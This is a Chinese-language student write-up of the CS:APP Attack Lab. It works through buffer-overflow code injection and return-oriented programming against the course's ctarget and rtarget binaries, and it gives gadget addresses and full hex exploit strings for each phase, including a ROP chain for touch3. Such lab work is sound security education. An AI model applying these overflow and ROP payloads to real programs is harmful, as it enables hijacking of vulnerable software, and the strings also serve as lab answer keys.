## touch1 
- 很简单,将touch1地址覆盖getbuf的返回地址即可
getbuf申请的缓冲区为0x28 40 个字节
填充后再添加上地址即可
## touch2
- 要求我将cookie作为参数传入
目前在思考如何在正确位置传参
touch2 使用的是rdi,那么其必然是有使用内存引用的
那么,其放在哪个位置?
一番波折之后,这是不可能的
我们不可能通过缓冲区直接改写rdi中的数据
我们需要使用指令
所以
又是和ai交流后
得知一个关键
就是如何正确的使用我们写入的缓冲区
我们直接在缓冲区写入的数据会被当作一个地址
不过
这是在方法调用中
如果我们在方法调用后
再回到我们输入代码的这块缓冲区
编译器就会解读我们输入的机器码
所以我们将机器码写在开头
修改rdi的值
然后关键一点
我们该如何结束呢
这里使用了ret指令
我们利用rpi指针的特性
提前在第一次ret时将地址写在其后一位
之后rpi移动,我们再次ret就是读取我们写入的第二个地址
那么,就成功跳转离开
## touch3
该函数将rdi放入rbx中,cookie放入edi中
然后使用hexmatch函数,这应该是关键
要求函数调用后返回的eax不为0,即为成功
研究后,这个实验的重点不是让我们看汇编,而是让我们学会攻击手段
由于是让我们比较字符串是否相同
在计算机中,严格来说只有01,一切的数据类型都是对01的解释不同
我们可以使用ascii码的表示来输入cookie
通过缓冲区将cookie写入到内存中
然后将cookie的首地址移入rdi中
这样读取rdi时就会读取cookie
同时考虑内存上的位置
我们不能直接写在缓冲区中
因为后续的各个寄存器的压栈,会覆盖我们在缓冲区中的旧内容
所以我们写在高地址,缓冲区之外
保证不被破坏
思路至此,试试再说
不知道对栈的破坏会不会造成其它问题
还真有问题,不知道出于什么原因,虽然成功进入了touch3
但是被提前终止了
可能有抓人程序
<!-- 00000000 5561dc78 -->
### hexmatch
这个方法是比较两个字符串是否相同的
一个是系统内部的cookie
另一个是我们指定的
如何指定才是问题

写完归来
真是吐了
实现方法是rop
很简单,只需要使用 pop rid
其原理是先从栈上弹出一个地址给rid
然后再弹一个地址返回
只要先跳转到pop rid 的位置
再给rid 赋值上我们存放的地址
再跳转到touch3就可以了
当然,rop好像在ctarget里并不需要
所以这就是我坐牢的地方
因为ctarget的限定一直没有使用这个方法
现在讲讲历程
先是存放字符串
这点很简单
看看手册就能联想出来
存放在缓冲区上面保证安全性
但是之后的步骤,才是恶心的
问题就是栈帧的破坏
如果我对返回地址后面进行修改
就会对栈帧产生不可避免的破坏
然后被sprintf_chk斩杀
也就是凭借ret和rsp自然的移动,就会被gank
这里试错了很久,保持原样都无用
无法绕开
然后试图不通过ret自动移动
而是使用push的添加
使用命令的对栈修改不会破坏栈帧
这里出现又出现了00符号的问题
其原因就是因为我通过get这样字符串输入的手段
进行命令解释
会将其解释成休止符导致终止
所以这条路也被ban了
唉
无力
我是fw
所以最后使用rop
通过命令的添加移动和使用,保证了栈的内存完整性,而不是强硬的修改
所以简单通过了
# rtarget
## phase 4
重新实现phase2,使用rop,让我康康
touch2 需要我们传入cookie
是数值的对比
从start_farm到end_farm有我们使用的小工具
由于比较的是edi
所以我们只需要找到cookie,然后将其传入rdi即可
然后我查看工具农场
找到两个有用的
58 90 c3 -> pop rax
48 89 c7 -> movq rax rdi
我们先将cookie存入栈,pop给rax,再mov给rdi,就达成了
AA填充
4019ab - > ab 19 40 00 00 00 00 00
pop    - > fa 97 b9 59 00 00 00 00
4019a2 - > a2 19 40 00 00 00 00 00
当时写到这就结束了
忘记加上
touch3 -> ec 17 40 00 00 00 00 00
phase4不算难,只要理解了rop很快就能写出
过会写phase5
我又来了说是
将字符串输入
同时不破坏栈
就用我上一次的思路如何
不过不清楚对字符串的存储是否会有影响
AAA
也是将其字符串地址存入rdi中
ab 19 40 00 00 00 00 00
c0 dc 61 55 00 00 00 00 比上回多了一行
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
果然不简单
现在的问题是
1 地址的变化
我存储cookie没有那么轻易了
2 栈破坏
上一次使用了一个绝佳的位置存储,避免了破坏,这次没有这么轻易
所以得像办法将字符串存起来先
我们没有可以直接使用的地址
但是在gdb时观察到
随着rop链移动,rsp指向了我们的字符串
那要是我将其再往后移动,然后以此为地址不就可以了吗
将rsp的地址赋给某个寄存器
然后将其加上一定数值得到字符串存储的地址
然后赋给rdi
对啊
我们可以使用运算
指定一个低地址,如8,一个获取当前rsp,一个寄存器用来运算
通过内存运算得到相对位置
由农场见(%rdi,%rsi,1),%rax

再将rax放入rdi中
即可没有直接运行rsp的
找找间接的
有48 89 e0 移入rax 也行
那就是再将rax移入 rdi
列一下顺序
先对rsi赋值
401383 5e c3
0x xxxx
然后取rsp的地址
401a06 48 89 e0   0 
rsp -> rax
然后将其放入rdi    8
4019a2 48 89 c7
rax -> rdi
然后运算字符串地址
4019d6
lea rdi,rsi,1 rax 10
再将rax返回        18
4019a2
再跳到touch3       20
4018fa
字符串             28
AAAA
83 13 40 00 00 00 00 00
28 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
先试试吧
结果不行,应该是我破坏了栈导致的,可能是rop太多了?
报错

勾吧要烂尾了
算了
烂尾吧
找不出问题
以后再来吧
牛魔
妈的受不了
最后用农场里的家伙拼一次
我的首要目标
就是计算出存储字符串的正确地址
这点和rsp挂钩
为了降低工作量,我就站在巨人肩膀上得了
寻找前往rsi指令
找到一个 
401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
将ecx放入esi
然后找ecx的
只有一个勉强能用
401a6e:	c7 07 89 d1 91 c3 
89 d1 91 c3
先将rdx放入rcx
再交换rax和rcx
 那我还得想办法再交换回来
 401a5a:	c7 07 48 89 e0 91    	movl   $0x91e08948,(%rdi)
  401a60:	c3                   	ret
还真有
那我再交换回来
就成功完成对rcx赋值,再将rcx给rsi
4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	ret
用这个对rdx先赋值
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	ret
 用这个pop rax
然后计算地址
再将地址给rdi
最后跳转touch3
试试吧
part 1 写一下对应汇编和对应机器码地址
pop rax              4019ab
mov eax edx          4019dd
mov edx ecx          401a70
xchg eax ecx         401a73 <!--上一步mov必定触发,但是 因为eax 等于ecx,所以不管-->
mov ecx esi          401a13
mov rsp,rax          401a06        
mov rax, rdi         4019a2
lea(%rdi,%rsi,1),rax 4019d6
mov rax,rdi          4019a2
ret
touch3               4018fa
part 2 写出结果密钥
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
20 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
70 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
06 1a 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61


爽爽爽爽
写出来了
堂堂完结
佩服搞安全的
真是博大精深
区区冰山一脚
居然恐怖如斯
ps : 原来真是我第一次使用了主函数的锅(hhh)
